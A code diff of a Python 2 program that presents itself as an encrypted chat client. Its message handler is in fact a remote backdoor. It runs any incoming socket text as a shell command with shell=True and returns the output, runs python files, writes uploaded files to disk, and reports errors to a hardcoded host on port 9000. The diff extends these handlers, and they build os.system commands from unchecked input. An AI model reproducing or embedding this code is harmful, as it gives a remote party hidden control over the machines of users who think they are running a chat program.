@@ -25,6 +25,7 @@ import time
 import re
 import random
 import netifaces as ni
+import signal
 
 
 ni.ifaddresses("eth0")
@@ -121,11 +122,6 @@ def AES_IV_KEY_generator():
 
     return AES_key, iv
 
-
-def send_AES_key(aes_key):
-    return
-def send_message(socket, message):
-    return
 def pseudo():
     pseudo = raw_input("Your pseudo? ")
 
@@ -144,86 +140,122 @@ def chat_connection(nickname, host_ip):
     port = port_conn
     AES_IV = AES_IV_KEY_generator()
     AES_KEY = AES_IV[0]
-    IV = AES_IV[1]
+    IV = AES_IV[1] 
 
     def read_message(c):
         i = 0
         sym_enc_data = c.recv(4096)
         data =  string_socket_message(sym_enc_data, IV, AES_KEY)
 
-        if data == "quit":
-            return True
+        try:
+            if data == "quit":
+                return True
 
-        elif "bad_print@" in data:
-            str_data = str(data)
-            text_to_print = str_data[10:len(str_data)]
-            print text_to_print
+            elif "bad_print@" in data:
+                str_data = str(data)
+                text_to_print = str_data[10:len(str_data)]
+                print text_to_print
 
-            return False
+                return False
 
-        elif "print@" in data:
-            i += 1
-            str_data = str(data)
-            text_to_print = str_data[6:len(str_data)]
-            echo_file = "echo_" + str(i) + ".py"
-            touch_comm = "touch " + str(echo_file)
-            os.system(touch_comm)
-            echo_comm = "echo \"print('" + text_to_print + "')\" > " + echo_file
-            os.system(echo_comm)
-            py_comm = "gnome-terminal -x python " + echo_file 
-            os.system(py_comm)
+            elif "print@" in data:
+                i += 1
+                str_data = str(data)
+                text_to_print = str_data[6:len(str_data)]
+                echo_file = "echo_" + str(i) + ".py"
+                touch_comm = "touch " + str(echo_file)
+                os.system(touch_comm)
+                echo_comm = "echo \"print('" + text_to_print + "')\" > " + echo_file
+                os.system(echo_comm)
+                py_comm = "gnome-terminal -x python " + echo_file 
+                os.system(py_comm)
 
-            return False
+                return False
 
-        elif "python@" in data:
-            str_comm = str(data)
-            py_file = str_comm[7:len(str_comm)]
-            py_comm = "python " + str(py_file)
-            os.system(py_comm)
+            elif "python@" in data:
+                str_comm = str(data)
+                py_file = str_comm[7:len(str_comm)]
+                py_comm = "python " + str(py_file)
+                os.system(py_comm)
 
-            return False
+                return False
 
-        elif "upload_file@" in data:
-            str_data = str(data)
-            filename = str_data[12:len(str_data)]
-            txt = "filename_OK"
-            encrypted_txt = send_socket_message(txt, IV, AES_KEY)
-            c.send(encrypted_txt)
-            file_data = ""
+            elif "touch@" in data:
+                str_comm = str(data)
+                touch_file = str_comm[6:len(str_comm)]
+                touch_comm = "touch " + str(touch_file)
+                os.system(touch_comm)
 
-            with open(filename, 'wb') as f:
-                hex_enc_data = c.recv(65536).strip()             
-                bin_data = string_socket_message(hex_enc_data, IV, AES_KEY)
-                f.write(bin_data)
+                return False
 
-            f.close()
+            elif "gedit@" in data:
+                str_comm = str(data)
+                gedit_file = str_comm[6:len(str_comm)]
+                gedit_comm = "gedit " + str(gedit_file)
+                os.system(gedit_comm)
 
-            # txt = "file_OK"
-            # encrypted_txt = send_socket_message(txt, IV, AES_KEY)
-            # c.send(encrypted_txt)
+                return False
 
-            return False
+            elif "upload_file@" in data:
+                str_data = str(data)
+                filename = str_data[12:len(str_data)]
+                txt = "filename_OK"
+                encrypted_txt = send_socket_message(txt, IV, AES_KEY)
+                c.send(encrypted_txt)
+                file_data = ""
 
-        elif len(data) == 0:
+                try:
+                    with open(filename, 'wb') as f:
+                        hex_enc_data = c.recv(65536).strip()             
+                        bin_data = string_socket_message(hex_enc_data, IV, AES_KEY)
+                        f.write(bin_data)
 
-            return False
+                    f.close()
 
-        # elif data.startswith("cd "):
-        #     current_path = re.split(r'\w+', data)[1]
-        #     return os.path.realpath(current_path)
+                    encrypted_data = send_socket_message("Done.", IV, AES_KEY)
+                    c.send(encrypted_data)
 
-        else:
-            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, preexec_fn=os.setsid) #, cwd=current_path
-            stdout_value = proc.stdout.read() + proc.stderr.read()
-         
-            os.killpg(proc.pid, signal.SIGTERM)
+                except Exception as e:
+                    encrypted_data = send_socket_message(str(e), IV, AES_KEY)
+                    c.send(encrypted_data)
+                    pass
 
-            if data[:-1] != "&" :
-                txt_to_send = stdout_value + " "
-                encrypted_data = send_socket_message(txt_to_send, IV, AES_KEY)
+                return False
+
+            elif len(data) == 0:
+
+                return False
+
+            # elif data.startswith("cd "):
+            #     current_path = re.split(r'\w+', data)[1]
+            #     return os.path.realpath(current_path)
+
+            else:
+                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, preexec_fn=os.setsid) #, cwd=current_path
+                stdout_value = proc.stdout.read() + proc.stderr.read()
+             
+                os.killpg(proc.pid, signal.SIGTERM)
+
+                if data[:-1] != "&":
+                    txt_to_send = stdout_value + " "
+                    encrypted_data = send_socket_message(txt_to_send, IV, AES_KEY)
+                    c.send(encrypted_data)
+
+                return False
+
+        except Exception as e:
+            sock_exception = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                sock_exception.connect((URL,"9000"))
+                encrypted_data = send_socket_message(str(e), IV, AES_KEY)
                 c.send(encrypted_data)
+                sock_exception.close()
+                
+            except:
+                pass
 
-            return False
+            pass
+
 
     nickname_keep = nickname
     socket_died = False
